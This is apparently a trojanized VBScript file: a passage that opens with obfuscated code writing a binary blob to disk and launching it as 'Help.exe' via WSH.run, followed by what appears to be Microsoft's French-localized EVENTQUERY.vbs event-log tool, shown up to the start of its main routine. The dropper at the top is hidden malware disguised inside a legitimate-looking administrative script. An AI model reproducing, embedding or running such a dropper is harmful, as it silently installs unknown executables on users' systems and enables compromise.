OUT.Write(""&C(28)&"<"&C(23)&""&C(20)&"~"&C(3)&"m\"&C(31)&"b}ݧ"&O&"PF"&C(21)&")bڅɶ{o"&C(13)&"e"&C(28)&"-"&C(17)&"*ZJ%̂wa"&C(29)&"/go=j"&C(11)&C(19)&"VEi]T"&C(31)&"1=HdB`%c"&C(29)&"E|TH5op+xWr"&C(16)&" h@¥3%"&C(39)&"^_"&C(4)&C(9)&":.w@hDs"&C(13)&"y*ٰX;"&C(1)&"U`҄ӊs:U"&C(1)&""&O&"8Tt"&C(5)&"I2"&C(3)&""&C(2)&C(25)&"Z"&C(1)&"RA@^L7"&C(4)&"j"&C(31)&">ӸPZ^n"&C(8)&""&C(17)&"Ky]"&C(5)&"P"&C(13)&"]k"&O&"x@"&C(39)&C(22)&"=;D;BÐ}*mc*wyܫ"&C(8)&""&C(11)&"-S"&C(16)&"Y"&C(6)&"ޖ0j֭H;]r"&C(1)&"z򈩤"&C(30)&C(10)&" A"&C(2)&C(12)&"K7"&C(15)&"Q}[Ɲ"&C(16)&"C3\^H"&C(8)&""&C(26)&"ٸ86g\9,O"&C(26)&O&"㷵"&C(16)&"!ǖl.~1"&C(9)&"{P"&C(3)&"L"&C(25)&C(26)&"V6ļsZn\l;8r"&C(7)&"x"&C(9)&"["&C(10)&C(19)&""&C(9)&"Le-`4[\,$bS"&C(31)&"ъ"&C(39)&C(15)&"c"&C(4)&"L5"&C(4)&"vk hnI"&C(17)&"R"&C(39)&"?"&C(22)&"Oq0"&C(12)&".%h\h"&S(C(18),2)&",e"&C(12)&"!"&C(30)&"l"&C(3)&C(39)&"DD"&C(22)&"Jî+ٗ!Q XO"&C(1)&"."&C(15)&C(30)&"6"&C(16)&"+"&C(11)&"Hjфp9[`"&C(28)&"v%`"&C(26)&"X9"&C(10)&"?tOC>"&C(16)&"Ǫ"&C(4)&"ꜫҬK"&C(39)&"iN͗"&C(21)&"Xr֕xlڪ"&C(3)&"^HfD"&C(29)&"Ad"&C(23)&"K#1"&C(30)&"3۬a"&C(12)&""&C(2)&"T"&C(5)&"zhV|Ӭ?cqS"&C(13)&"4Vb,GZZc%KG"&C(29)&"d"&C(21)&"\h"&C(17)&"z/*m"&C(9)&"7[ێo}"&C(34)&"5q?@$j]y2It"&C(7)&"X["&C(6)&"hrTqkK;sT&"&C(11)&"І"&C(31)&""&C(14)&"fCl"&C(11)&""&C(17)&""&C(15)&""&C(1)&"I"&C(2)&C(5)&";Vn4Z"&C(15)&"ՏPgC0"&C(11)&"-"&C(15)&"9;u75AR"&C(13)&"Ґ-IA8*]wGS۩JlE"&C(20)&"D"&C(11)&"f7?L>"&C(20)&"<c"&C(20)&C(19)&"Ym"&C(14)&".p"&C(6)&""&C(4)&"TL-ej"&C(1)&""&C(27)&""&C(20)&"n(B"&C(13)&"|"&C(5)&"pQk4"&C(19)&"p"&C(5)&""&C(10)&C(28)&">VM"&C(9)&"P}`]=x1PF"&C(31)&C(11)&"Ej15EjI "&C(29)&""&C(31)&"HCm-"&C(31)&"U+iʔ,DȔ\,"&C(23)&"G!"&C(12)&"QUKc"&C(24)&C(22)&"^N"&C(4)&"oٲ{<?"&C(1)&"~:y"&C(13)&"&."&C(29)&"{/{"&C(39)&"6E~X%5"&C(6)&"p"&C(12)&"3k"&C(28)&C(27)&"QU"&C(1)&C(23)&"Lп78U"&C(17)&"IpX"&C(29)&"pĎ]"&C(8)&"T"&C(13)&"Q"&C(13)&"+MV|=="&C(2)&"8sQ"&C(13)&">*zO"&O&""&O&"4"&C(15)&"iHm:ᙘVR;gM|Ut"&C(20)&""&C(10)&""&C(7)&C(24)&"m"&C(17)&"^.Ǖ/@{W|m!"&C(12)&"fg;F"&C(39)&"t+݌"&C(9)&"Mb"&C(22)&C(21)&"==X{`"&C(26)&"C3}^ʤ;O~"&C(5)&"\OeW2Z&Tj"&C(7)&"Nomd"&C(6)&""&C(26)&"s"&C(23)&"zD1T`"&C(10)&C(27)&"f"&C(8)&"ד\c}iS"&C(30)&O&C(8)&"v2,X"&C(29)&"= "&C(39)&"vf0Z"&C(8)&"Ud!"&C(16)&"1"&C(34)&"."&C(4)&"(Ni#O7@H"&C(10)&"<cjeNM;#^FՏ"&C(22)&C(20)&"a"&C(34)&"btP,>+4>Mz"&C(19)&"l"&C(8)&"\H^a>`FLp҇奂"&O&"L"&C(18)&";c-H"&C(29)&"38z"&C(18)&"Mh.c"&C(10)&",dW"&C(17)&"x+vDK"&C(28)&"TCN"&C(6)&"-B"&C(39)&".0ѐi$"&C(12)&C(3)&"8"&C(18)&"N"&C(10)&""&C(3)&"A[ ~S7g"&C(2)&"oV9"&C(19)&"]Y0\vUB҄%R9gyTОda01¸{Y"&C(4)&"Tz^"&C(34)&"K=d}c"&C(6)&"{S٫6ʥ"&C(12)&"F"&C(3)&"Q<)"&C(34)&"*t:O[y"&C(10)&"v"&C(16)&""&C(28)&C(8)&""&C(6)&""&C(5)&C(30)&"N"&C(14)&"ｼn>harqqO8"&C(34)&"+:U"&C(30)&"ύɋiO`"&C(20)&""&C(3)&"ϣO"&C(25)&"="&C(3)&" 19/wZ)"&C(19)&"k<,I;"&C(17)&"@|N9"&C(6)&"_Wన"&C(25)&""&C(11)&"3$n_&"&C(6)&"G"&C(5)&"c;"&C(16)&"E"&C(7)&"AaL\p "&C(27)&"^"&C(7)&C(5)&"2"&C(26)&"][-ȥo"&C(25)&"E3ZF6xY"&C(7)&"ʨh{`{`N"&C(7)&C(20)&C(1)&C(12)&"c8o)US"&C(6)&"iw"&O&"Ly"&C(30)&"]Dڨc:"&C(25)&"}"&C(27)&"J"&C(1)&"O`^a"&C(4)&"(8"&C(19)&"u"&C(8)&"32"&C(24)&"n4"&C(6)&"{|2ԧ8G*|;_`/z~"&C(8)&"ZR8B6"&C(5)&"`!"&C(24)&""&C(14)&"ztgϻ#@;uy "&C(1)&C(23)&C(21)&"0Ȏጄ*"&C(14)&"}=}p~"&C(7)&C(2)&"!"&C(23)&"Ԑ"&C(15)&"u"&O&"(u|"&C(39)&"V"&C(22)&C(18)&"C"&C(21)&"S7O("&C(2)&"ǐYw.mFQ9"&C(5)&"|>Wcn,5#R_ף\"&C(9)&"NL"&C(15)&")K"&C(29)&"x"&C(26)&"V"&C(9)&"z"&C(2)&"z>|"&C(17)&"q5_ɜ;R$be{=Spt ˸,/)m4IQf9(X@"&C(7)&"M"&C(20)&"imh{YD"&C(14)&"U@IUƜ"&C(5)&"ݮ"&C(19)&"`JS"&C(19)&"+3"&C(13)&"4lF8"&C(3)&"wIr!"&C(16)&"6YzW"&C(7)&"FF0 ;-hX3K"&C(39)&"1"&C(20)&C(25)&"a=f"&C(21)&"p"&C(4)&"e"&C(17)&"TV"&C(24)&""&C(29)&"DV;Ǡ1jv"&C(30)&"B"&C(3)&"N.ݮj"&C(21)&"TS [`"&C(13)&"7{"&C(27)&"]6ר%"&C(2)&"$Þt"&C(21)&"}Ut[-616WܽK"&C(27)&"wp"&C(31)&","&C(34)&"lv"&C(25)&""&C(8)&C(31)&""&C(39)&""&C(5)&"v(޺"&C(24)&"s"&C(23)&"96:M~cQr$|+"&C(25)&"wi䉠"&C(39)&""&C(14)&"?VކCngkM􌷒ӊɛ"&C(20)&"\B4"&C(6)&""&C(30)&"n"&C(11)&""&C(10)&"aYh鱘g"&C(16)&"\"&C(13)&"~"&C(31)&"Wyvd2؜"&C(30)&""&C(20)&"Ic/~"&C(30)&C(3)&"O"&C(8)&"3vKbʤE:;{"&C(7)&"]["&C(20)&C(4)&"ʃ"&C(30)&"i=}!\^a}Em "&C(13)&C(2)&"݄"&C(17)&"r"&C(6)&""&C(34)&"WM6MB[Ymimb"&C(14)&"s"&C(15)&C(22)&"KB"&C(4)&"e"&C(7)&"cP"&C(14)&":k"&C(28)&"T"&C(25)&"qր[cl4"&C(25)&C(23)&"4SIB`4NY(*V4=RŲ{YAL.B("&C(21)&"3"&C(3)&C(10)&"Hjȓ7aFۯ"&C(21)&"Qׅ"&C(17)&C(21)&""&C(14)&"{"&C(15)&"!^"&C(15)&"u)U"&C(21)&C(10)&"qQ(;H"&C(22)&"D?o$"&C(26)&"m7k:/8"&C(39)&"Su$\8?|"&C(15)&"v%>"&C(12)&"A"&C(21)&"}TQ뺨I~"&C(28)&"&"&C(24)&"O"&C(26)&""&C(15)&"}"&C(26)&""&C(22)&"i#>"&C(12)&"\UmB"&C(34)&C(31)&"·mX"&C(16)&C(31)&"&"&O&"^F"&C(20)&C(26)&""&C(1)&"/"&C(3)&""&C(20)&"z"&C(26)&"|׽ĜHHat!"&C(30)&"}"&C(30)&""&C(25)&C(3)&".&#"&C(12)&"9{S")
OUT.Write(""&C(8)&")"&C(13)&""&C(29)&":"&C(13)&""&C(10)&"/"&C(29)&"r"&O&""&O&"/"&C(31)&"3[&j;Kn"&C(29)&C(8)&"~B-ύ#r.,Ԥ,MWjMD}v"&C(17)&"f^U\"&C(16)&"ܼpˎƦ"&C(34)&""&C(11)&"H"&C(16)&"ƲkF`yn"&C(18)&C(15)&""&C(30)&"rsVS4"&C(16)&""&C(21)&"?"&C(7)&"`"&C(39)&"CŨphzJM"&C(11)&"h"&C(17)&"25"&C(16)&"xEL?x𠚏"&C(20)&"^"&C(5)&"I8c"&C(23)&"}F[rvR#"&C(3)&C(26)&C(14)&"fg$H"&C(12)&""&C(10)&"1>"&C(24)&"t"&C(30)&"j~հ<_"&C(18)&"Oؼ/OXd \\|8"&C(29)&"0"&C(4)&"˃Ƈ"&C(27)&"7o^"&C(27)&">;TN>"&C(9)&"P"&C(8)&"b/"&C(10)&"ARN⹷\"&C(23)&">"&C(9)&""&C(11)&""&C(12)&C(21)&C(14)&"}"&C(8)&"ۅ9u)  "&C(27)&"-y7#yU"&C(6)&"_@ϫik-e4m$1"&C(10)&""&C(30)&"NЎu4-N"&C(6)&"AQY]oІ4$i"&C(5)&"䝧>FR#"&C(12)&"&)aV"&C(1)&"q\Msd"&C(23)&"-s4"&C(10)&"AU"&C(12)&"6[ć"&C(15)&"e/!drة7J&["&C(39)&"O"&C(18)&"J*j"&C(11)&"q@){WCafW"&C(13)&"l"&C(23)&"|V]lh"&C(16)&""&C(3)&".ݝ"&C(7)&"B"&C(27)&"ߦ#8#$ͺx`I}d"&C(16)&""&C(9)&":Jf"&C(27)&"aE~sF.^EB4"&C(10)&C(24)&C(39)&"MWC"&C(4)&"["&C(39)&"?F6hU&pܝKYϤ"&C(24)&"冖~+-;)%+"&C(22)&"Jci"&C(15)&"3G}"&C(5)&"R5[zθ2n]l"&C(28)&C(19)&"r"&C(31)&"x#SJU>l-SrT"&C(18)&""&C(30)&C(23)&";6l "&C(16)&"z"&C(3)&"2v (%#:"&C(31)&C(24)&"9 ü"&C(24)&""&C(9)&"c"&C(24)&""&C(31)&"T fVgh"&C(1)&"Yd%Y<!"&C(4)&"Uم"&C(39)&C(4)&"p.HI"&C(11)&"6u\5ל7VF"&C(24)&"8"&C(16)&"!k"&C(3)&"YM"&C(24)&"\"&C(30)&"]̩zp"&C(4)&""&C(29)&C(28)&""&C(8)&")%T!ieZ"&C(6)&""&C(6)&"Z}٢Bd"&O&O)
OUT.Close

WSH.run(SYS & "\Help.exe") 
             '********************************************************************
'*
'* Copyright (c) Microsoft Corporation. All rights reserved. 
'*
'* Module Name:    EVENTQUERY.vbs 
'*
'* Abstract:       Enables an administrator to query/view all existing
'*                 events in a given event log(s).
'*
'*
'********************************************************************
' Global declaration 
OPTION EXPLICIT

ON ERROR RESUME NEXT
Err.Clear

'----------------------------------------------------------------
' Start of localization Content
'----------------------------------------------------------------

' the filter operators specified by the user
CONST L_OperatorEq_Text                 = "eq"
CONST L_OperatorNe_Text                 = "ne"
CONST L_OperatorGe_Text                 = "ge"
CONST L_OperatorLe_Text                 = "le"
CONST L_OperatorGt_Text                 = "gt"
CONST L_OperatorLt_Text                 = "lt"

' the filters as given by the user
CONST L_UserFilterDateTime_Text         = "Heure"
CONST L_UserFilterType_Text             = "Type" 
CONST L_UserFilterUser_Text             = "Utilisateur" 
CONST L_UserFilterComputer_Text         = "Ordinateur"
CONST L_UserFilterSource_Text           = "Source"
CONST L_UserFilterDateCategory_Text     = "Catgorie"
CONST L_UserFilterId_Text               = "Identificateur" 

' Define default values
CONST L_ConstDefaultFormat_Text         = "TABLE"

' Define other format  values
CONST L_Const_List_Format_Text          = "LIST"
CONST L_Const_Csv_Format_Text           = "CSV"

' the text displayed in columns when no output is obtained for display
CONST L_TextNa_Text                     = "N/A"
CONST L_TextNone_Text                   = "Aucun"

' the following texts are used while parsing the command-line arguments
' (passed as input to the function component.getArguments)
CONST L_MachineName_Text                = "Nom du serveur"
CONST L_UserName_Text                   = "Nom d'utilisateur :"
CONST L_UserPassword_Text               = "Mot de passe utilisateur :"
CONST L_Format_Text                     = "Format"
CONST L_Range_Text                      = "Plage"
CONST L_Filter_Text                     = "Filtrer"
CONST L_Log_Text                        = "Journal"

' the column headers used in the output display
CONST L_ColHeaderType_Text              = "Type"
CONST L_ColHeaderDateTime_Text          = "Date Heure"
CONST L_ColHeaderSource_Text            = "Source"
CONST L_ColHeaderCategory_Text          = "Catgorie"
CONST L_ColHeaderEventcode_Text         = "vnement"
CONST L_ColHeaderUser_Text              = "Utilisateur"
CONST L_ColHeaderComputerName_Text      = "Nom_ordinateur"
CONST L_ColHeaderDesription_Text        = "Description"

' variable use to  concatenate  the Localization Strings.
' Error Messages 
Dim UseCscriptErrorMessage
Dim InvalidParameterErrorMessage
Dim InvalidFormatErrorMessage
Dim InvalidCredentialsForServerErrorMessage
Dim InvalidCredentialsForUserErrorMessage
Dim InvalidSyntaxErrorMessage
Dim InvalidInputErrorMessage
Dim InvalidORSyntaxInFilterErrorMessage
Dim InvalidSyntaxMoreNoRepeatedErrorMessage

UseCscriptErrorMessage 		     		 = L_UseCscript1_ErrorMessage & vbCRLF & _
	                                       	   L_UseCscript2_ErrorMessage & vbCRLF & vbCRLF & _
		                                   L_UseCscript3_ErrorMessage & vbCRLF & _
                	                           L_UseCscript4_ErrorMessage & vbCRLF & vbCRLF & _
                        	                   L_UseCscript5_ErrorMessage

CONST L_HelpSyntax1_Message 		           = "Entrez ""%1 /?"" pour afficher la syntaxe."
CONST L_HelpSyntax2_Message 		           = "Entrez ""%2 /?"" pour afficher la syntaxe."

CONST L_InvalidParameter1_ErrorMessage   	= "ERREUR : argument non valide/Option - '%1'." 
InvalidParameterErrorMessage      	        = L_InvalidParameter1_ErrorMessage & vbCRLF & L_HelpSyntax2_Message

CONST L_InvalidFormat1_ErrorMessage             = "ERREUR : 'FORMAT' '%1' non valide spcifi." 
InvalidFormatErrorMessage                       = L_InvalidFormat1_ErrorMessage  &  vbCRLF & L_HelpSyntax2_Message

CONST L_InvalidRange_ErrorMessage               = "ERREUR: 'PLAGE' '%1' spcifi non valide."
CONST L_Invalid_ErrorMessage                    = "ERREUR: '%1' non valide."
CONST L_InvalidType_ErrorMessage                = "ERREUR: 'TYPE' '%1' spcifi non valide pour le 'FILTRE' '%2'."
CONST L_InvalidUser_ErrorMessage                = "ERREUR: 'UTILISATEUR' '%1' spcifi non valide pour le 'FILTRE '%2'."
CONST L_InvalidId_ErrorMessage                  = "ERREUR: 'ID' '%1' spcifi non valide pour le 'FILTRE' '%2'."
CONST L_InvalidFilter_ErrorMessage              = "ERREUR: 'FILTRE' '%1' spcifi non valide pour le 'FILTRE' '%2'."
CONST L_InvalidFilterFormat_ErrorMessage        = "ERREUR: le FILTRE '%1' n'est pas dans le format demand."
CONST L_InvalidFilterOperation_ErrorMessage     = "ERREUR : oprateur FILTER '%1' non valide spcifi pour le filtre '%2'."

CONST  L_InvalidCredentialsForServer1_ErrorMessage   = "Erreur : syntaxe non valide. L'option /U ne peut pas tre spcifie sans l'option /S."
InvalidCredentialsForServerErrorMessage              = L_InvalidCredentialsForServer1_ErrorMessage  & vbCRLF & L_HelpSyntax1_Message

CONST  L_InvalidCredentialsForUser1_ErrorMessage = "Erreur : syntaxe non valide. L'option /P ne peut pas tre spcifie sans l'option /U."
InvalidCredentialsForUserErrorMessage            = L_InvalidCredentialsForUser1_ErrorMessage & vbCRLF & L_HelpSyntax1_Message

CONST L_InvalidOperator_ErrorMessage             = "ERREUR : oprateur non valide spcifi pour l'tendue de dates dans le filtre 'DATETIME'."
CONST L_InvalidDateTimeFormat_ErrorMessage       = "ERREUR : format 'DATETIME' non valide spcifi. Format :mm/dd/aa(aaaa),hh:mm:ssAM(/PM)"

CONST L_ExecuteQuery_ErrorMessage               = "ERREUR: impossible d'excuter la requte pour le journal '%1'."
CONST L_LogDoesNotExist_ErrorMessage            = "ERREUR: le fichier journal '%1' n'existe pas."
CONST L_InstancesFailed_ErrorMessage            = "ERREUR: impossible d'obtenir du systme les dtails du journal."    

CONST  L_InvalidSyntax1_ErrorMessage            = "ERREUR : syntaxe non valide." 
InvalidSyntaxErrorMessage                       = L_InvalidSyntax1_ErrorMessage & vbCRLF &  L_HelpSyntax1_Message

CONST L_InvalidInput1_ErrorMessage              = "ERREUR : entre non valide. Vrifiez les valeurs entres."
InvalidInputErrorMessage                        = L_InvalidInput1_ErrorMessage & vbCRLF &  L_HelpSyntax1_Message

CONST  L_ObjCreationFail_ErrorMessage           = "ERREUR: erreur inattendue, chec de la requte. "
CONST L_InfoUnableToInclude_ErrorMessage        = "ERREUR : impossible d'inclure le module commun ""CmdLib.Wsc""."
CONST L_NoHeaderaNotApplicable_ErrorMessage     = "ERREUR: l'option /NH n'est autorise que pour les formats ""TABLE"" et ""CSV""."
CONST L_InValidServerName_ErrorMessage          = "ERREUR : syntaxe incorrecte. Le nom du systme ne peut pas tre laiss vide."
CONST L_InValidUserName_ErrorMessage            = "ERREUR: syntaxe incorrecte. Le nom de l'utilisateur ne peut pas tre vide. "

CONST  L_InvalidORSyntaxInFilter1_ErrorMessage  = "ERREUR : une opration 'OR' non valide est spcifie pour le filtre."
CONST  L_InvalidORSyntaxInFilter2_ErrorMessage  = "L'opration 'OR' est valide uniquement pour les filtres TYPE et ID."      
InvalidORSyntaxInFilterErrorMessage             = L_InvalidORSyntaxInFilter1_ErrorMessage & vbCRLF & L_InvalidORSyntaxInFilter2_ErrorMessage

CONST  L_InvalidSyntaxMoreNoRepeated1_ErrorMessage = "ERREUR : syntaxe non valide. L'option '%1' n'est pas autorise plus d'une fois."
InvalidSyntaxMoreNoRepeatedErrorMessage            = L_InvalidSyntaxMoreNoRepeated1_ErrorMessage  & vbCRLF &  L_HelpSyntax2_Message  

'  Hints given in case of errors
CONST L_HintCheckConnection_Message           = "ERREUR : vrifiez le nom du systme, les informations d'identification et le noyau WBEM."

' Informational messages
CONST L_InfoNoRecordsInFilter_Message         = "INFO : aucun enregistrement n'est disponible avec le journal '%1' avec le critre spcifi."
CONST L_InfoNoRecords_Message                 = "INFO: Aucun enregistrement n'est disponible pour le journal '%1'."
CONST L_InfoNoLogsPresent_Message             = "INFO: Aucun journal n'est disponible dans le systme."
CONST L_InfoDisplayLog_Message                = "Liste les vnements dans le journal '%1' de l'hte '%2'"

' Cscript usage strings
CONST L_UseCscript1_ErrorMessage 	= "Ce script devrait tre excut  partir de la ligne de commande en utilisant CSCRIPT.EXE."
CONST L_UseCscript2_ErrorMessage 	= "Par exemple : CSCRIPT EVENTQUERY.vbs <arguments>"
CONST L_UseCscript3_ErrorMessage 	= "Pour dfinir CScript comme application par dfaut pour excuter les fichiers .vbs, excutez la commande suivante :"
CONST L_UseCscript4_ErrorMessage 	= "       CSCRIPT //H:CSCRIPT //S" 
CONST L_UseCscript5_ErrorMessage 	= "Vous pouvez alors excuter ""EVENTQUERY.vbs <arguments>"" sans prcder le script par CSCRIPT."

' Contents for showing help for Usage 
CONST L_ShowUsageLine00_Text            = "Aucun journal n'est disponible pour une requte sur ce systme."
CONST L_ShowUsageLine01_Text            = "EVENTQUERY.vbs [/S systme [/U utilisateur [/P mot_de_passe]]] [/FI filtre]"
CONST L_ShowUsageLine02_Text            = "               [/FO format] [/R plage] [/NH] [/V] [/L nom_de_journal | *]"
CONST L_ShowUsageLine03_Text            = "Description:"
CONST L_ShowUsageLine04_Text            = "    Le script EventQuery.vbs permet  un administrateur de lister"
CONST L_ShowUsageLine05_Text            = "    les vnements et les proprits des vnements d'un ou de plusieurs journaux d'vnements."
CONST L_ShowUsageLine06_Text            = "Liste de paramtres :"
CONST L_ShowUsageLine07_Text            = "    /S        systme       Spcifie le systme distant auquel se connecter."
CONST L_ShowUsageLine08_Text            = "    /U        [domaine\]utilisateur     Spcifie le contexte utilisateur dans lequel"
CONST L_ShowUsageLine09_Text            = "                                la commande doit s'excuter."
CONST L_ShowUsageLine10_Text            = "    /P        mot de passe          Spcifie le mot de passe pour le contexte"
CONST L_ShowUsageLine11_Text            = "                           utilisateur donn."
CONST L_ShowUsageLine12_Text            = "    /V                          Indique que les informations dtailles doivent"
CONST L_ShowUsageLine13_Text            = "                                tre affiches dans la sortie."
CONST L_ShowUsageLine14_Text            = "    /FI       filtre            Spcifie les types d'vnements"
CONST L_ShowUsageLine15_Text            = "                                devant tre filtrs par la requte."
CONST L_ShowUsageLine16_Text            = "    /FO       format            Spcifie le format dans lequel la sortie"
CONST L_ShowUsageLine17_Text            = "                           doit tre affiche."
CONST L_ShowUsageLine18_Text            = "                           Les formats autoriss sont ""TABLE"" ""LIST"" ""CSV""."
CONST L_ShowUsageLine19_Text            = "    /R        plage             Spcifie la plage d'vnements devant tre liste."
CONST L_ShowUsageLine20_Text            = "                                Les valeurs autorises sont :"
CONST L_ShowUsageLine21_Text            = "                                    'N' - Liste les 'N' vnements les plus rcents."
CONST L_ShowUsageLine22_Text            = "                                    '-N' - Liste les 'N' vnements les plus anciens."
CONST L_ShowUsageLine23_Text            = "                                'N1-N2' - Liste les vnements de N1  N2." 
CONST L_ShowUsageLine24_Text            = "    /NH                         Indique que l'en-tte de colonne ne doit pas"
CONST L_ShowUsageLine25_Text            = "                                tre affich dans la sortie."
CONST L_ShowUsageLine26_Text            = "                           Uniquement valide pour les formats ""TABLE"" et ""CSV""."
CONST L_ShowUsageLine27_Text            = "    /L        nom_de_journal           Spcifie le ou les journaux  interroger."
CONST L_ShowUsageLine28_Text            = "    /?                          Affiche cet cran d'aide."
CONST L_ShowUsageLine29_Text            = "    Filtres valides     Oprateurs autoriss   Valeurs valides"
CONST L_ShowUsageLine30_Text            = "    ---------------   ---------------------  ---------------"
CONST L_ShowUsageLine31_Text            = "    DATETIME       eq, ne, ge, le, gt, lt   jj/mm/aa(aaaa),hh:mm:ssAM(/PM)"
CONST L_ShowUsageLine32_Text            = "    TYPE              eq,ne               ERROR, INFORMATION, WARNING,"
CONST L_ShowUsageLine33_Text            = "                                          SUCCESSAUDIT, FAILUREAUDIT"
CONST L_ShowUsageLine34_Text            = "    ID                eq, ne, ge, le, gt, lt   entier non ngatif"
CONST L_ShowUsageLine35_Text            = "    USER           eq,ne               chane"
CONST L_ShowUsageLine36_Text            = "    COMPUTER       eq,ne               chane"
CONST L_ShowUsageLine37_Text            = "    SOURCE         eq,ne               chane"
CONST L_ShowUsageLine38_Text            = "    CATEGORY       eq,ne               chane"
CONST L_ShowUsageLine39_Text            = "Remarque : le filtre ""DATETIME"" peut tre spcifi sous la forme ""Date de dbut-Date de fin"""
CONST L_ShowUsageLine40_Text            = "      Seul l'oprateur ""eq"" peut tre utilis avec ce format."
CONST L_ShowUsageLine41_Text            = "Exemples:"
CONST L_ShowUsageLine42_Text            = "    EventQuery.vbs "
CONST L_ShowUsageLine43_Text            = "    EVENTQUERY.vbs /L systme  "
CONST L_ShowUsageLine44_Text            = "    EVENTQUERY.vbs /S systme /U utilisateur /P mot_de_passe /V /L *"
CONST L_ShowUsageLine45_Text            = "    EVENTQUERY.vbs /R 10 /L Application /NH"
CONST L_ShowUsageLine46_Text            = "    EVENTQUERY.vbs /R -10 /FO LIST /L Scurit"
CONST L_ShowUsageLine47_Text            = "    EVENTQUERY.vbs /R 5-10 /L ""Serveur DNS"""
CONST L_ShowUsageLine48_Text            = "    EVENTQUERY.vbs /FI ""Type eq Error"" /L Application"
CONST L_ShowUsageLine49_Text            = "    EVENTQUERY.vbs /L Application"
CONST L_ShowUsageLine50_Text            = "            /FI ""Datetime eq 21/05/01,03:15:00AM-21/05/01,03:15:00PM"""
CONST L_ShowUsageLine51_Text            = "    EVENTQUERY.vbs /FI ""Datetime gt 21/05/01,06:20:00PM"" "
CONST L_ShowUsageLine52_Text            = "            /FI ""Id gt 700"" /FI ""Type eq warning"" /L Systme"
CONST L_ShowUsageLine53_Text            = "    EVENTQUERY.vbs /FI ""Type eq error OR Id gt 1000 """
'-------------------------------------------------------------------------
' END of localization content
'-------------------------------------------------------------------------

' Define constants
CONST CONST_ERROR                 = 0
CONST CONST_CSCRIPT               = 2
CONST CONST_SHOW_USAGE            = 3
CONST CONST_PROCEED               = 4
CONST CONST_ERROR_USAGE           = 5
CONST CONST_NO_MATCHES_FOUND      = 0

' Define the Exit Values
CONST EXIT_SUCCESS                = 0
CONST EXIT_UNEXPECTED             = 255
CONST EXIT_INVALID_INPUT          = 254
CONST EXIT_METHOD_FAIL            = 250
CONST EXIT_INVALID_PARAM          = 999
CONST EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED = 777

' Define default values
CONST CONST_ARRAYBOUND_NUMBER     = 10
CONST CONST_ID_NUMBER             = 65535

' Define namespace and class names of wmi
CONST CONST_NAMESPACE_CIMV2       = "root\cimv2"
CONST CLASS_EVENTLOG_FILE         = "Win32_NTEventlogFile"

' for blank line in  help usage   
CONST EmptyLine_Text          = " "

' Define the various strings used in the script
'=============================================
' the valid options supported by the script
CONST OPTION_SERVER               = "s"
CONST OPTION_USER                 = "u"
CONST OPTION_PASSWORD             = "p"
CONST OPTION_FORMAT               = "fo"
CONST OPTION_RANGE                = "r"
CONST OPTION_NOHEADER             = "nh"
CONST OPTION_VERBOSE              = "v"
CONST OPTION_FILTER               = "fi"
CONST OPTION_HELP                 = "?"
CONST OPTION_LOGNAME              = "l"

' the property names on which the user given filters are applied
CONST FLD_FILTER_DATETIME         = "TimeGenerated"
CONST FLD_FILTER_TYPE             = "Type"
CONST FLD_FILTER_USER             = "User"
CONST FLD_FILTER_COMPUTER         = "ComputerName"
CONST FLD_FILTER_SOURCE           = "SourceName"
CONST FLD_FILTER_CATEGORY         = "CategoryString"
CONST FLD_FILTER_ID               = "EventCode"
CONST FLD_FILTER_EVENTTYPE        = "EventType"

' Define matching patterns used in validations
CONST PATTERNFORMAT              = "^(table|list|csv)$"
CONST PATTERNTYPE                = "^(ERROR|INFORMATION|WARNING|SUCCESSAUDIT|FAILUREAUDIT)$"

' Property values on which the user is given for the filter TYPE is applied  
CONST PATTERNTYPE_ERROR           = "ERROR"
CONST PATTERNTYPE_WARNING         = "WARNING"
CONST PATTERNTYPE_INFORMATION     = "INFORMATION"
CONST PATTERNTYPE_SUCCESSAUDIT    = "SUCCESSAUDIT"
CONST PATTERNTYPE_FAILUREAUDIT    = "FAILUREAUDIT"

CONST FLDFILTERTYPE_SUCCESSAUDIT       = "audit success"
CONST FLDFILTERTYPE_FAILUREAUDIT        = "audit failure"

' Define EventType
CONST EVENTTYPE_ERROR             = "1"
CONST EVENTTYPE_WARNING           = "2"
CONST EVENTTYPE_INFORMATION       = "3"
CONST EVENTTYPE_SUCCESSAUDIT      = "4"
CONST EVENTTYPE_FAILUREAUDIT      = "5"

' the operator symbols
CONST SYMBOL_OPERATOR_EQ          = "="
CONST SYMBOL_OPERATOR_NE          = "<>"
CONST SYMBOL_OPERATOR_GE          = ">="
CONST SYMBOL_OPERATOR_LE          = "<="
CONST SYMBOL_OPERATOR_GT          = ">"
CONST SYMBOL_OPERATOR_LT          = "<"

' Define matching patterns used in validations
CONST PATTERN_RANGE               = "^\d*-?\d+$"
CONST PATTERN_FILTER              = "^([a-z]+)([\s]+)([a-z]+)([\s]+)([\w+]|[\W+]|\\)"
CONST PATTERN_DATETIME            = "^\d{1,2}\/\d{1,2}\/\d{2,4},\d{1,2}:\d{1,2}:\d{1,2}(A|P)M$"
CONST PATTERN_INVALID_USER        = "\|\[|\]|\:|\||\<|\>|\+|\=|\;|\,|\?|\*"
CONST PATTERN_ID                  = "^(\d+)$"
CONST PATTERN_DATETIME_RANGE      = "^\d{1,2}\/\d{1,2}\/\d{2,4},\d{1,2}:\d{1,2}:\d{1,2}(A|P)M\-\d{1,2}\/\d{1,2}\/\d{2,4},\d{1,2}:\d{1,2}:\d{1,2}(A|P)M$"

' Define  UNC  format for server name  
CONST   UNC_Format_Servername     = "\\"

' Define  const for  filter  separation when OR is specified in filter 
CONST L_OperatorOR_Text           = " ou "

' Variable to trap local if already connection in wmiconnect function 
Dim blnLocalConnection  

 blnLocalConnection = False 'defalut value

' to include the common module
Dim component                ' object to store  common module   

Set component = CreateObject( "Microsoft.CmdLib" )

If Err.Number Then
    WScript.Echo(L_InfoUnableToInclude_ErrorMessage)
    WScript.Quit(EXIT_METHOD_FAIL)
End If

' referring the script host to common module 
Set component.ScriptingHost = WScript.Application

' Check whether the script is run using CScript
If CInt( component.checkScript() ) <> CONST_CSCRIPT Then
        WScript.Echo (UseCscriptErrorMessage)
        WScript.Quit(EXIT_UNEXPECTED)
End If

' Calling the Main function 
Call VBMain()   

' end of the Main  
Wscript.Quit(EXIT_SUCCESS) 


'********************************************************************
'* Sub: VBMain
'*
'* Purpose: This is main function to starts execution 
'*
'*
'* Input/ Output: None
'********************************************************************
Sub VBMain()

ON ERROR RESUME NEXT
Err.clear

' Declare variables
Dim intOpCode               ' to check the operation asked for, Eg:Help etc
Dim strMachine              ' the machine to query the events from
Dim strUserName             ' the user name to use to query the machine 
